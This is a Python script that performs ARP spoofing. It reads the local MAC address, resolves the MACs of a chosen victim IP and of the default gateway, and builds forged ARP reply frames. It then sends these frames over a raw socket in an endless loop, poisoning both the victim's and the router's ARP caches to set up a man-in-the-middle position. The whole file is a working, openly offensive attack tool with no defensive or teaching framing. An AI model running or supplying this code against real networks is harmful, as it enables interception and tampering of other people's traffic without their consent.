import socket
import struct
import binascii
from time import sleep
import subprocess
import fcntl

def get_local_mac(interface="eth0"):
    """
    Retrieves the local MAC address of a given interface using socket and fcntl.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        mac = fcntl.ioctl(
            sock.fileno(),
            0x8927,  # SIOCGIFHWADDR
            struct.pack("256s", interface[:15].encode("utf-8"))
        )[18:24]
        return ":".join(f"{b:02x}" for b in mac).upper()
    except Exception as e:
        print(f"[!] Failed to get MAC address for interface {interface}: {e}")
        return None

def get_mac(ip):
    """
    Retrieves the MAC address corresponding to the given IP address using the `arp` command.
    """
    try:
        output = subprocess.check_output(["arp", "-n", ip], encoding="utf-8")
        for line in output.splitlines():
            if ip in line:
                return line.split()[2]
    except Exception as e:
        print(f"Failed to get MAC address for {ip}: {e}")
    return None

def create_arp_packet(src_mac, src_ip, target_mac, target_ip, operation=2):
    """
    Creates an ARP packet.
    """
    type_hardware = 1
    type_protocol = 0x0800
    len_hardware = 6
    len_protocol = 4

    # Ethernet frame
    ethernet_frame = struct.pack(
        "!6s6sH",
        binascii.unhexlify(target_mac.replace(":", "")),
        binascii.unhexlify(src_mac.replace(":", "")),
        0x0806
    )

    # ARP header
    arp_header = struct.pack(
        "!HHBBH6s4s6s4s",
        type_hardware,               # Hardware type (Ethernet)
        type_protocol,               # Protocol type (IPv4)
        len_hardware,                # Hardware address length
        len_protocol,                # Protocol address length
        operation,                   # ARP operation (2 for reply)
        binascii.unhexlify(src_mac.replace(":", "")),  # Sender MAC
        socket.inet_aton(src_ip),    # Sender IP
        binascii.unhexlify(target_mac.replace(":", "")),  # Target MAC
        socket.inet_aton(target_ip)  # Target IP
    )

    return ethernet_frame + arp_header

def perform_arp_spoof(victim_ip, iface="eth0"):
    """
    Performs ARP spoofing against the specified victim IP.
    """
    # Get local MAC address
    raw = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0806))
    raw.bind((iface, socket.htons(0x0806)))

    local_mac = get_local_mac()
    if not local_mac:
        print("[!] Failed to retrieve local MAC address.")
        return

    # Get victim MAC address
    victim_mac = get_mac(victim_ip)
    if not victim_mac:
        print(f"[!] Failed to retrieve victim MAC address for {victim_ip}.")
        return

    # Get router IP and MAC address
    router_ip = subprocess.check_output(["ip", "route"], encoding="utf-8").split("default via ")[1].split()[0]
    router_mac = get_mac(router_ip)
    if not router_mac:
        print(f"[!] Failed to retrieve router MAC address for {router_ip}.")
        return

    print(f"[*] Local MAC: {local_mac}")
    print(f"[*] Victim MAC: {victim_mac} ({victim_ip})")
    print(f"[*] Router MAC: {router_mac} ({router_ip})")

    # Create ARP spoof packets
    victim_packet = create_arp_packet(local_mac, router_ip, victim_mac, victim_ip)
    router_packet = create_arp_packet(local_mac, victim_ip, router_mac, router_ip)

    print("[*] Starting ARP spoofing...")
    try:
        while True:
            raw.send(victim_packet)
            raw.send(router_packet)
            sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Stopping ARP spoofing.")
        raw.close()

